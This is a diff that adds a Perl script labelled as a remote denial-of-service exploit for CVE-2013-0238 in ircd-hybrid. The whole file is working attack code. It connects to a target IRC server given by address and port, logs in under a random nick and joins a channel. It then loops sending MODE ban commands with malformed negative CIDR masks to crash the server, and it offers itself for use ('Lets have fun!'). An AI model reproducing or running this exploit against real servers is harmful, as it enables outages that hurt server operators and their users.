@@ -1,0 +1,84 @@
+#!/usr/bin/perl
+# ircd-hybrid remote denial of service exploit for CVE-2013-0238
+# quick and dirty h4x by kingcope
+# tested against ircd-hybrid-8.0.5 centos6
+# please modify below in case of buggy code.
+# enjoy!
+
+use Socket;
+
+srand(time());
+$exploiting_nick = "hybExpl" . int(rand(10000));
+    
+sub connecttoserver()
+{
+ $bool = "yes";
+ $iaddr = inet_aton($ircserver) || die("Failed to find host: $ircserver");
+ $paddr = sockaddr_in($ircport, $iaddr);
+ $proto = getprotobyname('tcp');
+ socket(SOCK1, PF_INET, SOCK_STREAM, $proto) || die("Failed to open socket:$!");
+ connect(SOCK1, $paddr) || {$bool = "no"};
+}
+
+sub usage() {
+ 
+ print "usage: ircd-hybrid.pl <target> <port>\r\n";
+ exit;
+}
+
+$| = 1;
+print "----------------------------------------------------------------------\r\nLets have fun!\r\n";
+print "----------------------------------------------------------------------\r\n";
+
+if (!defined($ARGV[1])) {
+ usage(); 
+}
+
+$ircport = $ARGV[1];
+$ircserver = $ARGV[0];
+
+print "Connecting to $ircserver on port $ircport...\n";
+
+connecttoserver();
+
+if ($bool eq "no")
+{
+ print "Connection refused.\r\n";
+ exit(0);
+}
+
+send(SOCK1,"NICK $exploiting_nick\r\n",0);
+send(SOCK1,"USER $exploiting_nick \"yahoo.com\" \"eu.hax.net\" :$exploiting_nick\r\n",0);
+
+while (<SOCK1>) { 
+ $line = $_;
+ print $line;
+ if ((index $line, " 005 ") ne -1) {
+  goto logged_in; 
+ }
+ 
+ if ((index $line, "PING") ne -1) {
+  substr($line,1,1,"O");
+  send(SOCK1, $line, 0); 
+ }
+}
+
+logged_in:
+
+print " ok\r\n"; 
+
+print "Sending buffers...\r\n";
+$channelr = int(rand(10000));
+send(SOCK1, "JOIN #h4xchan$channelr\r\n", 0);
+sleep(1);
+$k = 0;
+do {
+print $_;
+$k++;
+$crashnum = -1000009 - $k * 1000;
+send(SOCK1, "MODE #h4xchan$channelr +b *!*\@127.0.0.1/$crashnum\r\n", 0);
+} while(<SOCK1>);
+ 
+print "done\r\n";
+
+# EOF
